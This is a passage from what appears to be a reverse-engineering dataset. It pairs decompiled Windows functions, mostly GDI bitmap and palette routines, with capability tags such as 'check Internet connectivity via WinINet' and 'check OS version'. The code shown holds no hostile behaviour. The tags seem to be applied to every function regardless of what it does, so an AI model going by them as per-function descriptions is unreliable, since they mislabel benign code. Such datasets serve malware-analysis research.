  uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x42ab3c;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.0042a690();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.0042aad4::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x42ab59;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x42ab63;\n                fcn.00427324();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x42ab6a;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x42ab6f;\n        iStack188 = fcn.00427444();\n        puStack192 = 0x42ab7b;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x42ab80;\n        hdcDest = fcn.00427444();\n        uStack196 = 0x42b122;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x42abc7;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x42abcc;\n                var_10h = fcn.00427444();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x42abeb;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x42abf0;\n                var_10h = fcn.00427444();\n            }\n            uStack216 = 0x42ae3b;\n            fcn.00427444();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x42ae48;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x42ae4d;\n            var_14h = fcn.00427444();\n            iStack228 = 0x42b0d3;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x42b0c2;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x42ae88;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x42ae94;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x42b0a0;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x42af81;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00426938();\n                puStack288 = 0x42aed5;\n                fcn.0041b080(&fcn.0042aad4::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.0042aad4::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x42aee5;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x42aef3;\n                iStack296 = fcn.00425c78();\n                iStack300 = hdcDest;\n                puStack304 = 0x42aefd;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x42af08;\n                fcn.004268fc();\n                puStack304 = 0x42af0d;\n                puStack304 = fcn.00425c78();\n                iStack308 = hdcDest;\n                puStack312 = 0x42af17;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x42af38;\n                    var_30h = fcn.00425c78();\n                    puStack312 = 0x42af46;\n                    fcn.004268fc();\n                    puStack312 = 0x42af4b;\n                    var_2ch = fcn.00425c78();\n                    puStack312 = &fcn.0042aad4::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x42af94;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x42af99;\n                var_20h = fcn.00427444();\n                iStack308 = 0x42b076;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.00427444();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.00425c78();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.004268fc();\n                    uVar6 = fcn.00425c78();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.00427444();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x42b07d);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x42b0a7;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x42b09f;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x42ac02;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402b14();\n        uStack208 = 0x42ae2c;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x42ac3b;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x42ac48;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x42acf2;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x42ad43;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x42ad18;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x42ad50;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x42acd6;\n                fcn.00427be4();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x42ad79;\n            fcn.0042aa88();\n            iStack232 = 0x42ad8f;\n            fcn.00402d34();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.0042aad4::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x42ada6;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x42adab;\n        var_10h = fcn.00427444();\n        if (var_28h == 0) {\n            iStack256 = 0x42adb9;\n            fcn.0042739c();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x42ae33;\n            puStack248 = 0x42ae2b;\n            uVar8 = fcn.00402b44();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.0040406c();\n        fcn.0040406c();\n    }\n    return var_10h;\n}\n",
        "token_count": 3778
    },
    "0042b138": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0042b138(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x42b156;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 298
    },
    "0042b19c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042b19c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.0042b19c::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x42b1c4;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x42b1d3;\n            fcn.0042a690();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x42b397;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x42b1f2;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x42b1f7;\n            iStack160 = fcn.00427444();\n            uStack164 = 0x42b203;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x42b208;\n            hdcDest = fcn.00427444();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x42b21e;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x42b238;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x42b268;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x42b26d;\n                    hdc = fcn.00427444();\n                    uStack200 = 0x42b34f;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.0042aad4(0, &fcn.0042b19c::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x42b356);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x42b39e);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1359
    },
    "0042b3a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042b3a8(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004285f4();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.004037f0();\n    in_EAX[10] = iVar1;\n    fcn.0042a900();\n    if (*0x483630 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 222
    },
    "0042b6a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b6a8(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x42b6c9;\n    var_4h = param_2;\n    fcn.00427120();\n    uStack48 = 0x42b6d0;\n    fcn.0042bc38();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x42b6ef;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x42b6fe;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x42b710;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x42b71f;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.0042b6a8::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x42b752;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x42b760;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.0042b6a8::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x42b781;\n        cVar2 = fcn.0042ba34();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x42b78f;\n            uStack84 = fcn.0042704c();\n            puStack88 = 0x42b795;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x42b8e4;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x42b7aa;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x42b7b5;\n        fcn.0042bbd8();\n    }\n    puStack100 = 0x42b7bc;\n    fcn.0042b978();\n    puStack100 = 0x42b7c7;\n    fcn.00427120();\n    puStack100 = 0x42b7ce;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x42b879;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.00427444();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.0042b978();\n        uVar7 = 0;\n        fcn.004275e8(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x42b8be);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.0042b978(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x42b8eb);\n    }\n    return;\n}\n",
        "token_count": 1597
    },
    "0042b8f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042b8f8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.0042bb38();\n        fcn.0042b544(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.0042739c();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "0042b978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042b978(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.0042bb38();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.0042a70c();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.0042b604;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 180
    },
    "0042b9e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042b9e4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 196
    },
    "0042ba34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ba34(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 101
    },
    "0042bab4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042bab4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.0042bc38();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.0042aad4(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "0042bb38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042bb38(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x42bb65;\n        fcn.0041e9b0(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x42bbbb;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "0042bbd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
